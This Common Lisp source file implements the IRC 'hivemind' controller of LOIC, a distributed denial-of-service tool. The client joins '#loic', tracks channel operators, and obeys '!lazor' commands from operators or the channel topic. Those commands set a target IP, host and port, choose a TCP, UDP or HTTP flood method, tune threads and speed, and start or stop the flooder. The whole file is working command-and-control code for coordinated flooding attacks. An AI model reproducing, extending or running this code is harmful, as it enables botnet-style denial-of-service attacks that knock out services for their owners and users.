
(in-package loic-hive)

(defparameter *keyword* "!lazor")

(defclass hivemind (client)
  ((channel :type string :initform "#loic" :initarg :channel)
   (logger :initform (lambda (s) s) :initarg :logger)
   (flooder :initform (make-instance 'tcp-flooder) :initarg :flooder)
   (running :type boolean)
   (op-list)
   (thread)))

(defgeneric .log (hivemind msg) (:documentation "Writes stuff using the supplied logger"))

(defmethod .log ((bot hivemind) msg)
  (funcall (slot-value bot 'logger) (format nil "~&~A~%" msg)))

(defgeneric start (hivemind) (:documentation "Starts the hivemind"))

(defmethod start ((bot hivemind))
  (connect bot)
  (.log bot "Connected")
  (setf (slot-value bot 'running) t)
  (setf (slot-value bot 'thread)
        (make-thread (lambda () (receive-loop bot)))))

(defgeneric stop (hivemind) (:documentation "Stops the hivemind"))

(defmethod stop ((bot hivemind))
  (.log bot "Disconnected")
  (disconnect bot)
  (setf (slot-value bot 'running) nil))

(defgeneric reconnect (hivemind) (:documentation "Reconnect"))

(defmethod reconnect ((bot hivemind))
  (.log bot "Connection lost. Trying to reconnect")
  (connect bot)
  (setf (slot-value bot 'op-list) '())
  (.log bot "Reconnected"))

(defgeneric receive-loop (hivemind))

(defmethod receive-loop ((bot hivemind))
  (loop :while (slot-value bot 'running)
        :do (handler-case (receive-message bot)
              (connection-lost (c) (reconnect bot))
              (connection-closed (c) (reconnect bot)))))

(defgeneric parse-command (bot tokens) (:documentation "Parse command received from IRC."))

(defmacro try-param (name process)
  (let ((slot-name (gensym "SLOT")))
    `(let ((param ,(string-downcase (symbol-name (if (listp name)
                                                   (car name)
                                                   name))))
           (,slot-name ',(if (listp name)
                           (cadr name)
                           name)))
       (when (string= key param)
         (ignore-errors (setf (slot-value flooder ,slot-name) ,process))))))

(defmethod parse-command ((bot hivemind) tokens)
  (with-slots (flooder) bot
    (dolist (command tokens)
      (when (string= (string-downcase command) "start")
        (start-flooder flooder))
      (when (string= (string-downcase command) "stop")
        (stop-flooder flooder))
      (when (string= (string-downcase command) "default")
        (stop-flooder flooder)
        (setf flooder (make-instance 'tcp-flooder)))
      (let* ((tokens (split-sequence #\= command))
             (key (string-downcase (first tokens)))
             (value (second tokens)))
        (when value
          (when (string= key "method")
            (setf flooder (make-instance (case (intern (string-upcase value) :keyword)
                                           ((:tcp) 'tcp-flooder)
                                           ((:udp) 'udp-flooder)
                                           ((:http) 'http-flooder)))))
          (try-param (targetip target-ip) value)
          (try-param (targethost target-ip) value)
          (try-param timeout (parse-integer value))
          (try-param subsite value)
          (try-param message value)
          (try-param (port target-port)(parse-integer value))

          (try-param threads value)
          (try-param (random add-random-subsite) (string= value "true"))
          (try-param (speed delay) value))))))

;;; Some helpers

(defun get-ops (names)
  (mapcar (lambda (s) (subseq s 1))
          (remove-if (lambda (s)
                       (not (find (elt s 0)
                                  '(#\@ #\& #\~))))
                     (split-sequence #\Space names))))

(defun sender-nick (prefix)
  (car (split-sequence #\! prefix)))

(defun handle-topic (bot prefix args)
  (let ((tokens (split-sequence #\Space (second args))))
    (when (string= (first tokens) *keyword*)
      (.log bot (format nil "Received new orders from topic: ~A" (rest tokens))
            (parse-command bot (rest tokens))))))

;;; Handlers

(define-handler (:rpl_welcome (bot hivemind) prefix arguments)
                (send-join bot (slot-value bot 'channel)))

(define-handler (:rpl_namreply (bot hivemind) prefix args)
                (with-slots (op-list) bot
                  (setf op-list
                        (get-ops (cadddr args)))
                  (.log bot (format nil "Received new operators list: ~S" op-list))))

(define-handler (:mode (bot hivemind) prefix args)
                (with-slots (op-list) bot
                  (let ((mode (second args))
                        (whom (third args)))
                    (when (char= #\o (aref mode 1))
                      (when (char= #\- (aref mode 0))
                        (setf op-list (delete whom op-list :test #'string=)))
                      (when (char= #\+ (aref mode 0))
                        (push whom op-list))))))

(define-handler (:part (bot hivemind) prefix args)
                (with-slots (op-list) bot
                  (setf op-list (delete (second args) op-list :test #'string=))))

(define-handler (:quit (bot hivemind) prefix args)
                (with-slots (op-list) bot
                  (let ((who (sender-nick prefix)))
                    (setf op-list (delete who op-list :test #'string=)))))

(define-handler (:rpl_topic (bot hivemind) prefix args)
                (handle-topic bot prefix args))

(define-handler (:topic (bot hivemind) prefix args)
                (handle-topic bot prefix args))

(define-handler (:nick (bot hivemind) prefix args)
                (with-slots (op-list) bot
                  (let ((old-nick (sender-nick prefix))
                        (nick (second args)))
                    (when (find old-nick op-list :test #'string=)
                      (setf op-list (delete old-nick op-list :test #'string=))
                      (push nick op-list)))))

(define-handler (:kick (bot hivemind) prefix args)
                (with-slots (op-list) bot
                  (setf op-list (delete (second args) op-list :test #'string=))))

(define-handler (:privmsg (bot hivemind) prefix args)
                (with-slots (op-list) bot
                  (let ((sender (sender-nick prefix))
                        (tokens (split-sequence #\Space (second args))))
                    (when (and (find sender op-list :test #'string=)
                               (string= (first tokens) *keyword*))
                      (.log bot (format nil "New orders from ~A: ~A" sender (rest tokens)))
                      (parse-command bot (rest tokens))))))

; vim: set lisp softtabstop=2 expandtab filetype=lisp:
